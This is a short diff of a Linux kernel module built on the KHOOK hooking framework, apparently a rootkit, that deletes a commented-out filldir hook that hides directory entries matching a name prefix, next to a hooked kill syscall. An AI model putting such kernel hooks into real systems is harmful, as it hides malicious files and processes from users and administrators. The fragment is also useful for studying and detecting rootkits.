@@ -153,12 +153,6 @@ static long khook_sys_kill(pid_t pid, int sig) {
 	return ret;
 }
 
-// KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
-// static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
-// {
-// 	if (strncmp(name, hide, strlen(hide)) == 0)  return 0;                             
-// 	return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
-// }
 
 int init_module(void)
 {
